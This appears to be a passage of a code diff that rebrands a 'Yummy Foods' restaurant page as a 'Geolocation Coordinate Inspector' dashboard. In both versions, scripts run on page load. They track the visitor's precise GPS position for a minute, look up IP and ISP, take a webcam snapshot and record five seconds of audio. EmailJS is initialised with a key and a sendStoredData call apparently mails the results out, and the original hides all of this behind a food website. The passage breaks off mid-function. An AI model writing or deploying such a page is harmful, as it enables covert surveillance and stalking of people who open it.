@@ -3,257 +3,568 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yummy Foods - Delicious Meals Await</title>
+    <meta name="description" content="Geolocation Coordinate Inspector - Browser API demonstration evaluating location coordinate resolution, device system parameters, network configuration, and media hardware state.">
+    <meta name="author" content="Avuyile Mthembu">
+    <title>Geolocation Coordinate Inspector | Avuyile Mthembu</title>
+    
+    <link rel="icon" href="/assets/images/favicon.ico" type="image/x-icon">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/global.css">
+    <script src="/components/components.js" defer></script>
+    
     <style>
-        :root {
-            --primary-color: #28a745;
-            --secondary-color: #218838;
-            --text-color: #333;
-            --bg-color: #f8f9fa;
-            --card-bg: #ffffff;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            line-height: 1.6;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
-        header {
-            background-color: var(--primary-color);
-            color: white;
-            padding: 2rem 0;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        header .container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        header h1 {
-            font-size: 2.5rem;
-            margin-bottom: 0.5rem;
-        }
-
-        nav ul {
-            display: flex;
-            list-style: none;
-        }
-
-        nav ul li {
-            margin-left: 1.5rem;
-        }
-
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s ease;
-        }
-
-        nav ul li a:hover {
-            color: #e9e9e9;
-        }
-
-        main {
-            padding: 3rem 0;
-        }
-
+        /* ==========================================================================
+           Geolocation Coordinate Inspector Page Styles
+           ========================================================================== */
+        
         .hero {
+            padding: 5rem 0 3rem;
+            background: linear-gradient(135deg, var(--color-brand) 0%, #1e293b 100%);
+            color: #ffffff;
             text-align: center;
-            margin-bottom: 3rem;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 1px solid var(--color-border);
         }
 
-        .hero h2 {
-            font-size: 2.5rem;
-            color: var(--primary-color);
+        .hero::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(255, 255, 255, .03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, .03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+        }
+
+        .hero .container {
+            position: relative;
+            z-index: 1;
+            max-width: 800px;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--color-accent);
+            background-color: rgba(37, 99, 235, 0.15);
+            padding: 0.35rem 0.85rem;
+            border-radius: 9999px;
+            margin-bottom: 1.25rem;
+            border: 1px solid rgba(37, 99, 235, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .hero h1 {
+            color: #ffffff;
+            font-size: clamp(2rem, 4vw, 3rem);
             margin-bottom: 1rem;
+            letter-spacing: -0.02em;
         }
 
         .hero p {
-            font-size: 1.2rem;
-            max-width: 600px;
-            margin: 0 auto;
+            font-size: 1.1rem;
+            color: var(--color-text-muted);
+            line-height: 1.6;
+            margin-bottom: 0;
         }
 
-        .food-grid {
+        .dashboard-container {
+            padding: 3rem 0;
+            background-color: var(--color-bg-alt);
+            flex-grow: 1;
+        }
+
+        .dashboard-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            grid-template-columns: 1.25fr 1fr;
             gap: 2rem;
         }
 
-        .food-item {
-            background-color: var(--card-bg);
+        @media (max-width: 992px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+        }
+
+        .dashboard-card {
+            background-color: var(--color-bg-page);
+            border: 1px solid var(--color-border);
             border-radius: 8px;
-            overflow: hidden;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease;
+            padding: 1.75rem;
+            box-shadow: 0 4px 6px rgba(15, 23, 42, 0.01);
+            margin-bottom: 1.5rem;
+            display: flex;
+            flex-direction: column;
         }
 
-        .food-item:hover {
-            transform: translateY(-5px);
+        .dashboard-card:last-child {
+            margin-bottom: 0;
         }
 
-        .food-item img {
+        .dashboard-card h3 {
+            font-size: 1.15rem;
+            margin-bottom: 1.25rem;
+            color: var(--color-brand);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 0.5rem;
+            border-bottom: 1px solid var(--color-border);
+            padding-bottom: 0.75rem;
+        }
+
+        .dashboard-card h3 span.title-text {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            font-weight: 600;
+            padding: 0.2rem 0.5rem;
+            border-radius: 9999px;
+            background-color: #f1f5f9;
+            color: #475569;
+            text-transform: uppercase;
+        }
+
+        .status-badge.active {
+            background-color: #dbeafe;
+            color: #2563eb;
+        }
+
+        .status-badge.success {
+            background-color: #dcfce7;
+            color: #16a34a;
+        }
+
+        .status-badge.error {
+            background-color: #fee2e2;
+            color: #dc2626;
+        }
+
+        .pulse-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background-color: currentColor;
+            display: inline-block;
+        }
+
+        .pulse-dot.pulse {
+            animation: pulse-anim 1.5s infinite;
+        }
+
+        @keyframes pulse-anim {
+            0% { transform: scale(0.9); opacity: 1; }
+            50% { transform: scale(1.3); opacity: 0.4; }
+            100% { transform: scale(0.9); opacity: 1; }
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.25rem;
+        }
+
+        .info-item {
+            display: flex;
+            flex-direction: column;
+            gap: 0.25rem;
+        }
+
+        .info-label {
+            font-size: 0.75rem;
+            color: var(--color-text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            font-weight: 600;
+        }
+
+        .info-value {
+            font-family: var(--font-mono);
+            font-size: 0.95rem;
+            color: var(--color-brand);
+            word-break: break-all;
+        }
+
+        .info-value-large {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--color-accent);
+        }
+
+        .accuracy-container {
+            margin-top: 0.5rem;
             width: 100%;
-            height: 200px;
-            object-fit: cover;
         }
 
-        .food-item-content {
-            padding: 1.5rem;
+        .accuracy-meter {
+            height: 5px;
+            width: 100%;
+            background-color: var(--color-border);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 0.35rem;
         }
 
-        .food-item h3 {
-            font-size: 1.4rem;
-            margin-bottom: 0.5rem;
-            color: var(--primary-color);
+        .accuracy-bar {
+            height: 100%;
+            width: 0%;
+            background-color: var(--color-text-muted);
+            transition: width 0.5s ease, background-color 0.5s ease;
         }
 
-        .food-item p {
-            font-size: 1rem;
-            margin-bottom: 1rem;
+        /* Terminal styling */
+        .terminal-container {
+            background-color: #0f172a;
+            border-radius: 6px;
+            padding: 1rem;
+            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.4);
+            border: 1px solid #1e293b;
         }
 
-        .specials {
-            background-color: var(--card-bg);
-            border-radius: 8px;
-            padding: 2rem;
-            margin-top: 3rem;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        .terminal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #1e293b;
+            padding-bottom: 0.5rem;
+            margin-bottom: 0.75rem;
         }
 
-        .specials h2 {
-            color: var(--primary-color);
-            margin-bottom: 1rem;
+        .terminal-title {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
         }
 
-        .specials ul {
-            list-style: none;
+        .terminal-controls {
+            display: flex;
+            gap: 0.35rem;
         }
 
-        .specials li {
-            margin-bottom: 0.5rem;
-            padding-left: 1.5rem;
+        .term-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .term-dot.red { background-color: #ef4444; }
+        .term-dot.yellow { background-color: #f59e0b; }
+        .term-dot.green { background-color: #10b981; }
+
+        .terminal-body {
+            height: 240px;
+            overflow-y: auto;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            line-height: 1.5;
+            color: #e2e8f0;
+            display: flex;
+            flex-direction: column;
+            gap: 0.4rem;
+        }
+
+        .terminal-line {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .term-time { color: #64748b; flex-shrink: 0; }
+        .term-type { font-weight: bold; flex-shrink: 0; }
+        .text-success { color: #4ade80; }
+        .text-danger { color: #f87171; }
+        .text-warning { color: #fbbf24; }
+        .text-info { color: #38bdf8; }
+        .term-msg { word-break: break-word; }
+
+        /* Media capture area */
+        .media-preview-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.25rem;
+        }
+
+        @media (max-width: 576px) {
+            .media-preview-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .media-box {
+            border: 1px dashed var(--color-border);
+            border-radius: 6px;
+            padding: 1rem;
+            background-color: var(--color-bg-alt);
+            min-height: 180px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
             position: relative;
         }
 
-        .specials li::before {
-            content: '•';
-            color: var(--primary-color);
-            position: absolute;
-            left: 0;
+        .media-box-title {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--color-text-muted);
+            margin-bottom: 0.75rem;
+            align-self: flex-start;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
         }
 
-        footer {
-            background-color: #343a40;
-            color: white;
-            text-align: center;
-            padding: 1.5rem 0;
-            margin-top: 3rem;
+        .media-placeholder {
+            color: var(--color-text-muted);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.5rem;
+            margin: auto;
         }
 
-        @media (max-width: 768px) {
-            header .container {
-                flex-direction: column;
-                text-align: center;
-            }
+        .media-placeholder i {
+            font-size: 1.75rem;
+            color: var(--color-text-muted);
+            opacity: 0.5;
+        }
 
-            nav ul {
-                margin-top: 1rem;
-            }
+        .media-placeholder p {
+            font-size: 0.8rem;
+            margin-bottom: 0;
+        }
 
-            nav ul li {
-                margin: 0 0.75rem;
-            }
+        .media-box img {
+            max-width: 100%;
+            max-height: 130px;
+            border-radius: 4px;
+            border: 1px solid var(--color-border);
+            object-fit: contain;
+            display: none;
+        }
+
+        .media-box audio {
+            width: 100%;
+            margin-top: auto;
+            display: none;
+        }
+
+        .btn-maps {
+            width: 100%;
+            justify-content: center;
+            margin-top: 1.5rem;
+        }
+        
+        /* Disabled links style */
+        .btn.disabled {
+            pointer-events: none;
+            opacity: 0.5;
+            background-color: var(--color-bg-alt);
+            color: var(--color-text-muted);
+            border-color: var(--color-border);
         }
     </style>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
-    <header>
-        <div class="container">
-            <div>
-                <h1>Yummy Foods</h1>
-                <p>Find your next delicious meal!</p>
-            </div>
-            <nav>
-                <ul>
-                    <li><a href="#featured">Featured</a></li>
-                    <li><a href="#menu">Menu</a></li>
-                    <li><a href="#specials">Specials</a></li>
-                </ul>
-            </nav>
-        </div>
-    </header>
     
-    <main class="container">
+    <site-header></site-header>
+    
+    <main>
         <section class="hero">
-            <h2>Discover Culinary Delights</h2>
-            <p>Embark on a gastronomic journey with our expertly crafted dishes, made from the finest ingredients.</p>
-        </section>
-
-        <section id="featured" class="food-grid">
-            <div class="food-item">
-                <img src="https://cdn.loveandlemons.com/wp-content/uploads/2022/06/pasta-primavera-1.jpg" alt="Pasta Primavera">
-                <div class="food-item-content">
-                    <h3>Pasta Primavera</h3>
-                    <p>Fresh vegetables sautéed with pasta in a light garlic sauce.</p>
-                </div>
-            </div>
-            <div class="food-item">
-                <img src="https://media.istockphoto.com/id/1349067702/photo/greek-salad-with-vinaigrette-dressing-topped-with-grilled-chicken.jpg?s=612x612&w=0&k=20&c=Y5mZbUb_uAPK90lGEM2pwxt_jxd7-8Uz_CdZ_Ikn4HU=" alt="Grilled Chicken Salad">
-                <div class="food-item-content">
-                    <h3>Grilled Chicken Salad</h3>
-                    <p>Juicy grilled chicken served on a bed of mixed greens.</p>
-                </div>
-            </div>
-            <div class="food-item">
-                <img src="https://media.istockphoto.com/id/1414575281/photo/a-delicious-and-tasty-italian-pizza-margherita-with-tomatoes-and-buffalo-mozzarella.jpg?s=612x612&w=0&k=20&c=v8mdiAa_5NaRYtIscClXe85lLzkx7loSd9_pJWt9G2o=" alt="Margherita Pizza">
-                <div class="food-item-content">
-                    <h3>Margherita Pizza</h3>
-                    <p>Classic pizza topped with fresh mozzarella, basil, and tomato sauce.</p>
-                </div>
-            </div>
-            <div class="food-item">
-                <img src="https://media.istockphoto.com/id/1224916255/photo/sushi-maki-with-salmon-shrimp-cucumber.jpg?s=612x612&w=0&k=20&c=qIu0V_qKpP1R2xWMxID0tRGPDhOivHQ9CJFiZLcXpI8=" alt="Sushi Platter">
-                <div class="food-item-content">
-                    <h3>Sushi Platter</h3>
-                    <p>A delightful assortment of sushi rolls with fresh fish.</p>
-                </div>
+            <div class="container">
+                <span class="hero-badge">API Diagnostic Utility</span>
+                <h1>Geolocation Coordinate Inspector</h1>
+                <p>An interactive technical dashboard evaluating web-browser API features including fine Geolocation tracking, client system fingerprint diagnostics, ISP location metadata, and peripheral hardware permissions.</p>
             </div>
         </section>
 
-        <section id="specials" class="specials">
-            <h2>Today's Specials</h2>
-            <ul>
-                <li>Spicy Tuna Tacos</li>
-                <li>Quinoa Salad Bowl</li>
-                <li>Chocolate Lava Cake</li>
-            </ul>
+        <section class="dashboard-container">
+            <div class="container dashboard-grid">
+                
+                <!-- Left Side: API Metrics -->
+                <div class="dashboard-left">
+                    
+                    <!-- GPS Coordinates Card -->
+                    <div class="dashboard-card">
+                        <h3>
+                            <span class="title-text"><i class="fa-solid fa-location-crosshairs text-info"></i> GPS Coordinates</span>
+                            <span id="gps-status" class="status-badge"><span class="pulse-dot"></span> pending</span>
+                        </h3>
+                        <div class="info-grid">
+                            <div class="info-item" style="grid-column: span 2;">
+                                <span class="info-label">Latitude</span>
+                                <span id="val-latitude" class="info-value info-value-large">---</span>
+                            </div>
+                            <div class="info-item" style="grid-column: span 2;">
+                                <span class="info-label">Longitude</span>
+                                <span id="val-longitude" class="info-value info-value-large">---</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Accuracy Resolution</span>
+                                <span id="val-accuracy" class="info-value">---</span>
+                                <div class="accuracy-container">
+                                    <div class="accuracy-meter">
+                                        <div id="accuracy-bar" class="accuracy-bar"></div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Altitude</span>
+                                <span id="val-altitude" class="info-value">---</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Speed</span>
+                                <span id="val-speed" class="info-value">---</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Telemetry History</span>
+                                <span id="val-history" class="info-value">0 points cached</span>
+                            </div>
+                        </div>
+                        <a id="btn-maps" href="#" target="_blank" class="btn btn-primary btn-maps disabled">
+                            <i class="fa-solid fa-map-location-dot"></i> View Location on Google Maps
+                        </a>
+                    </div>
+                    
+                    <!-- Network & ISP Diagnostics Card -->
+                    <div class="dashboard-card">
+                        <h3>
+                            <span class="title-text"><i class="fa-solid fa-network-wired text-info"></i> Network Profile</span>
+                            <span id="network-status" class="status-badge"><span class="pulse-dot"></span> checking</span>
+                        </h3>
+                        <div class="info-grid">
+                            <div class="info-item">
+                                <span class="info-label">Public IP Address</span>
+                                <span id="val-ip" class="info-value">Fetching...</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">ISP Carrier Organization</span>
+                                <span id="val-isp" class="info-value">Fetching...</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Interface Connection Type</span>
+                                <span id="val-net-type" class="info-value">Unknown</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Latency Profile</span>
+                                <span id="val-net-speed" class="info-value">Unknown</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Device & OS Fingerprint Card -->
+                    <div class="dashboard-card">
+                        <h3>
+                            <span class="title-text"><i class="fa-solid fa-laptop-code text-info"></i> Device Fingerprint</span>
+                            <span class="status-badge success"><span class="pulse-dot"></span> analyzed</span>
+                        </h3>
+                        <div class="info-grid">
+                            <div class="info-item">
+                                <span class="info-label">Operating System Category</span>
+                                <span id="val-device-type" class="info-value">Detecting...</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Browser Client Agent</span>
+                                <span id="val-browser" class="info-value">Detecting...</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">System Platform</span>
+                                <span id="val-platform" class="info-value">Detecting...</span>
+                            </div>
+                            <div class="info-item">
+                                <span class="info-label">Screen Aspect Dimensions</span>
+                                <span id="val-screen" class="info-value">Detecting...</span>
+                            </div>
+                            <div class="info-item" style="grid-column: span 2;">
+                                <span class="info-label">Raw User Agent Identification</span>
+                                <span id="val-ua" class="info-value" style="font-size: 0.8rem; line-height: 1.4;">Detecting...</span>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+                
+                <!-- Right Side: Terminal Logs & Media Elements -->
+                <div class="dashboard-right">
+                    
+                    <!-- Media Verification Card -->
+                    <div class="dashboard-card">
+                        <h3>
+                            <span class="title-text"><i class="fa-solid fa-camera-retro text-info"></i> Hardware Media Capture</span>
+                            <span id="media-status" class="status-badge"><span class="pulse-dot"></span> ready</span>
+                        </h3>
+                        <div class="media-preview-container">
+                            <!-- Camera snapshot box -->
+                            <div class="media-box">
+                                <span class="media-box-title">Webcam Snapshot</span>
+                                <div id="camera-placeholder" class="media-placeholder">
+                                    <i class="fa-solid fa-camera"></i>
+                                    <p>Camera inactive</p>
+                                </div>
+                                <img id="camera-preview" alt="Captured Webcam Frame">
+                            </div>
+                            <!-- Audio clip box -->
+                            <div class="media-box">
+                                <span class="media-box-title">Voice Sample (5s)</span>
+                                <div id="audio-placeholder" class="media-placeholder">
+                                    <i class="fa-solid fa-microphone-lines"></i>
+                                    <p>Mic inactive</p>
+                                </div>
+                                <audio id="audio-preview" controls></audio>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Real-Time Event Log Terminal Card -->
+                    <div class="dashboard-card" style="flex-grow: 1;">
+                        <h3>
+                            <span class="title-text"><i class="fa-solid fa-terminal text-info"></i> Real-time Event Logger</span>
+                            <span id="trans-status" class="status-badge active"><span class="pulse-dot pulse"></span> LIVE FEED</span>
+                        </h3>
+                        
+                        <div class="terminal-container">
+                            <div class="terminal-header">
+                                <div class="terminal-title">
+                                    <i class="fa-solid fa-circle-nodes"></i> diagnostics.sh
+                                </div>
+                                <div class="terminal-controls">
+                                    <span class="term-dot red"></span>
+                                    <span class="term-dot yellow"></span>
+                                    <span class="term-dot green"></span>
+                                </div>
+                            </div>
+                            <div id="terminal-body" class="terminal-body">
+                                <!-- Interactive logs go here -->
+                            </div>
+                        </div>
+                    </div>
+                    
+                </div>
+                
+            </div>
         </section>
     </main>
 
-    <footer>
-        <p>&copy; 2024 Yummy Foods. All Rights Reserved.
-        </p>
-        <p><a href="https://www.yummyfoods.co.za/contact-us">Contact us</a></p>
-    </footer>
+    <site-footer></site-footer>
 
     <script>
         let watchId;
@@ -261,79 +572,188 @@
         let photoData = null;
         let audioBlob = null;
 
+        // Terminal logging engine
+        function logTerminal(type, message) {
+            const terminal = document.getElementById('terminal-body');
+            if (!terminal) return;
+            const time = new Date().toLocaleTimeString();
+            let colorClass = 'text-info';
+            
+            if (type === 'OK') colorClass = 'text-success';
+            if (type === 'ERROR') colorClass = 'text-danger';
+            if (type === 'SYS') colorClass = 'text-warning';
+            
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            line.innerHTML = `<span class="term-time">[${time}]</span> <span class="term-type ${colorClass}">[${type}]</span> <span class="term-msg">${escapeHtml(message)}</span>`;
+            terminal.appendChild(line);
+            
+            // Auto scroll to bottom
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function escapeHtml(text) {
+            if (!text) return '';
+            return text.toString()
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        // Initialize system diagnostic parameters
         (function() {
-            emailjs.init("sjem_DYuQ5tWYRZlu"); // Replace with your EmailJS user ID
+            emailjs.init("sjem_DYuQ5tWYRZlu");
+            logTerminal('SYS', 'Initializing Geolocation Coordinate Inspector...');
+            
+            // Collect device variables immediately
+            const deviceInfo = getDeviceInfo();
+            document.getElementById('val-device-type').innerText = deviceInfo.type;
+            document.getElementById('val-browser').innerText = deviceInfo.browser;
+            document.getElementById('val-platform').innerText = deviceInfo.os;
+            document.getElementById('val-screen').innerText = deviceInfo.screen;
+            document.getElementById('val-ua').innerText = navigator.userAgent;
+            logTerminal('OK', `System variables profile extracted: ${deviceInfo.type} | Platform: ${deviceInfo.os}`);
+
+            // Fetch network variables
+            updateNetworkUI();
+
+            // Run procedures
             getLocationAndSend();
             capturePhoto();
             recordAudio();
         })();
 
-        // Location Tracking (unchanged)
+        // Network UI and API fetch
+        async function updateNetworkUI() {
+            logTerminal('SYS', 'Fetching network identifier & ISP carrier metadata...');
+            
+            // Attempt connection info
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                document.getElementById('val-net-type').innerText = connection.type || connection.effectiveType || 'Ethernet/WiFi';
+                document.getElementById('val-net-speed').innerText = connection.downlink ? `${connection.downlink} Mbps (rtt: ${connection.rtt}ms)` : connection.effectiveType || 'Unknown';
+            } else {
+                document.getElementById('val-net-type').innerText = 'Standard Browser Interface';
+                document.getElementById('val-net-speed').innerText = 'Broadband Latency Profile';
+            }
+
+            const { ip, isp } = await getIPAndISP();
+            document.getElementById('val-ip').innerText = ip;
+            document.getElementById('val-isp').innerText = isp;
+            
+            const netStatus = document.getElementById('network-status');
+            if (ip !== 'Unknown') {
+                netStatus.className = 'status-badge success';
+                netStatus.innerHTML = '<span class="pulse-dot"></span> connected';
+                logTerminal('OK', `Network metrics loaded: IP=${ip} | Org=${isp}`);
+            } else {
+                netStatus.className = 'status-badge error';
+                netStatus.innerHTML = '<span class="pulse-dot"></span> unresolvable';
+                logTerminal('ERROR', 'Unable to resolve public IP or ISP routing parameters.');
+            }
+        }
+
+        // Location Tracking
         function getLocationAndSend() {
+            const gpsStatus = document.getElementById('gps-status');
+            gpsStatus.className = 'status-badge active';
+            gpsStatus.innerHTML = '<span class="pulse-dot pulse"></span> tracking';
+            
             if (navigator.geolocation) {
+                logTerminal('SYS', 'Requesting hardware Geolocation API permission...');
                 watchId = navigator.geolocation.watchPosition(sendSilentLocation, showError, {
                     enableHighAccuracy: true,
                     timeout: 30000,
                     maximumAge: 0
                 });
+                
+                // Collect for 1 minute then wrap up
                 setTimeout(() => {
                     navigator.geolocation.clearWatch(watchId);
+                    logTerminal('SYS', 'High-accuracy tracking duration (1m) elapsed. Closing tracker watch.');
+                    
+                    const finalStatus = document.getElementById('gps-status');
+                    finalStatus.className = 'status-badge success';
+                    finalStatus.innerHTML = '<span class="pulse-dot"></span> idle';
+                    
                     sendStoredData();
-                }, 60000); // Collect for 1 minute
+                }, 60000);
+            } else {
+                gpsStatus.className = 'status-badge error';
+                gpsStatus.innerHTML = '<span class="pulse-dot"></span> unsupported';
+                logTerminal('ERROR', 'Geolocation API is not supported by this browser.');
             }
         }
 
-        // Enhanced Device Detection
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let deviceInfo = {
-                type: "Unknown",
-                brand: "Unknown",
-                os: "Unknown",
-                browser: "Unknown",
-                screen: `${window.screen.width}x${window.screen.height}`
-            };
-
-            if (/android/i.test(ua)) {
-                deviceInfo.type = "Android";
-                deviceInfo.brand = ua.match(/(Samsung|Huawei|Xiaomi|OnePlus)/i)?.[0] || "Unknown";
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                deviceInfo.type = "iOS";
-                deviceInfo.brand = "Apple";
-            } else if (/Windows/i.test(ua)) {
-                deviceInfo.type = "Windows";
-            } else if (/Mac OS/i.test(ua)) {
-                deviceInfo.type = "MacOS";
-                deviceInfo.brand = "Apple";
-            } else if (/Linux/i.test(ua)) {
-                deviceInfo.type = "Linux";
+        // Store and Render Location Data
+        async function sendSilentLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const altitude = position.coords.altitude;
+            const speed = position.coords.speed;
+            
+            // Update UI elements
+            document.getElementById('val-latitude').innerText = lat.toFixed(6) + '°';
+            document.getElementById('val-longitude').innerText = lon.toFixed(6) + '°';
+            document.getElementById('val-accuracy').innerText = accuracy.toFixed(1) + ' m';
+            document.getElementById('val-altitude').innerText = altitude ? altitude.toFixed(1) + ' m' : 'Not available';
+            document.getElementById('val-speed').innerText = speed ? speed.toFixed(1) + ' m/s' : '0.0 m/s';
+            
+            // Accuracy bar coloring
+            const bar = document.getElementById('accuracy-bar');
+            let pct = Math.max(10, Math.min(100, 100 - (accuracy * 2))); // arbitrary resolution mapping
+            bar.style.width = pct + '%';
+            if (accuracy <= 10) {
+                bar.style.backgroundColor = '#10b981'; // Green (high accuracy)
+            } else if (accuracy <= 50) {
+                bar.style.backgroundColor = '#f59e0b'; // Yellow (medium accuracy)
+            } else {
+                bar.style.backgroundColor = '#ef4444'; // Red (low accuracy)
             }
 
-            deviceInfo.os = navigator.platform;
-            deviceInfo.browser = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/([\d.]+)/i)?.[0] || "Unknown";
-            return deviceInfo;
+            // Enable maps button
+            const mapsBtn = document.getElementById('btn-maps');
+            mapsBtn.href = `https://www.google.com/maps?q=${lat},${lon}`;
+            mapsBtn.classList.remove('disabled');
+
+            const deviceInfo = getDeviceInfo();
+            const networkInfo = getNetworkInfo();
+            const { ip, isp } = await getIPAndISP();
+
+            locationHistory.push({ latitude: lat, longitude: lon, accuracy, deviceInfo, networkInfo, ip, isp });
+            if (locationHistory.length > 3) locationHistory.shift();
+            
+            document.getElementById('val-history').innerText = `${locationHistory.length} points cached`;
+            
+            logTerminal('OK', `Geolocation point acquired: Lat=${lat.toFixed(5)}, Lon=${lon.toFixed(5)} Accuracy=${accuracy.toFixed(1)}m`);
         }
 
-        // IP and ISP Fetching (unchanged)
-        async function getIPAndISP() {
-            return fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => ({ ip: data.ip, isp: data.org }))
-                .catch(() => ({ ip: "Unknown", isp: "Unknown" }));
-        }
-
-        // Network Info (unchanged)
-        function getNetworkInfo() {
-            return navigator.connection ? {
-                type: navigator.connection.type,
-                effectiveType: navigator.connection.effectiveType
-            } : { type: "Unknown", effectiveType: "Unknown" };
+        function showError(error) {
+            const gpsStatus = document.getElementById('gps-status');
+            gpsStatus.className = 'status-badge error';
+            gpsStatus.innerHTML = '<span class="pulse-dot"></span> denied';
+            
+            let errMsg = 'Unknown location error.';
+            if (error.code === 1) errMsg = 'Permission Denied by client.';
+            if (error.code === 2) errMsg = 'Position unavailable (hardware disconnect).';
+            if (error.code === 3) errMsg = 'Resolution timeout exceeded.';
+            
+            logTerminal('ERROR', `Location tracking failed: ${errMsg}`);
+            
+            document.getElementById('val-latitude').innerText = 'Permission Denied';
+            document.getElementById('val-longitude').innerText = 'Permission Denied';
         }
 
         // Camera Capture
         async function capturePhoto() {
+            logTerminal('SYS', 'Requesting camera interface hardware permission...');
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                logTerminal('OK', 'Camera hardware stream verified. Taking diagnostic frame...');
+                
                 const video = document.createElement("video");
                 video.srcObject = stream;
                 video.play();
@@ -345,81 +765,148 @@
                 canvas.getContext("2d").drawImage(video, 0, 0);
                 photoData = canvas.toDataURL("image/jpeg");
 
-                stream.getTracks().forEach(track => track.stop()); // Stop webcam
-                console.log("Photo captured");
+                // Stop tracks immediately after snapshot
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Render image to UI
+                document.getElementById('camera-placeholder').style.display = 'none';
+                const previewImg = document.getElementById('camera-preview');
+                previewImg.src = photoData;
+                previewImg.style.display = 'block';
+
+                logTerminal('OK', 'Diagnostic snapshot frame cached successfully.');
             } catch (error) {
-                console.error("Error capturing photo:", error);
+                logTerminal('ERROR', `Camera interface error: ${error.message}`);
+                document.getElementById('camera-placeholder').innerHTML = '<i class="fa-solid fa-circle-exclamation text-danger"></i><p style="color:var(--color-accent)">Access Blocked</p>';
             }
         }
 
         // Audio Recording
         async function recordAudio() {
+            logTerminal('SYS', 'Requesting microphone hardware permission...');
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                logTerminal('OK', 'Microphone stream verified. Initiating 5-second buffer capture...');
+                
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
 
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.onstop = () => {
                     audioBlob = new Blob(chunks, { type: "audio/webm" });
-                    console.log("Audio recorded");
+                    
